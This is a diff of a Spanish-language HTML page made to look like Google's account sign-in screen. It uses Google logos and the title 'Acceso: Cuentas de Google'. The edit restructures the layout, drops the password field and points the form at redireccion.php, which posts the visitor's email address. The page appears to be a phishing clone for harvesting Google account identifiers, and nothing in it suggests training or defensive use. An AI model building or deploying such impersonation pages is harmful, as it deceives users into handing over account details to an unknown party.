@@ -5,11 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/png" href="google-logo-cabecera.png">
     <title>Acceso: Cuentas de Google</title>
-    <link rel="stylesheet" href="otro.css">
+    <link rel="stylesheet" href="login-styles.css">
 </head>
 <body>
 
     <div class="auth-container">
+        <!--
+        
         <div class="side-info">
             <div class="logo-placeholder">
                 <img src="google-recuadro.png" alt="Logo de mi negocio">
@@ -17,19 +19,22 @@
             <h1>Inicia sesión</h1>
             <p class="subtitle">Utiliza tu cuenta de Google</p>
         </div>
-
+        -->
         <div class="side-form">
-            <form method="post" action="login.php">
+
+            <div class="logo-placeholder">
+                <img src="google-recuadro.png" alt="Logo de mi negocio">
+            </div>
+            <h1>Inicia sesión</h1>
+            <p class="subtitle">Utiliza tu cuenta de Google</p>
+
+            <form method="post" action="redireccion.php">
                 <div class="input-wrapper">
-                    <input type="text" name="username" placeholder="Correo electrónico o teléfono" required>
+                    <input type="text" name="username" placeholder="Correo electrónico" required>
                 </div>
                 
-                <div class="input-wrapper">
-                    <input type="password" name="password" placeholder="Contraseña" required>
-                </div>
-
                 <a href="#" style="color: var(--google-blue-dark); text-decoration: none; font-size: 14px;">
-                    ¿Has olvidado tu contraseña?
+                    ¿Has olvidado tu correo electrónico?
                 </a>
                 <!--
                 <p class="mixed-text">
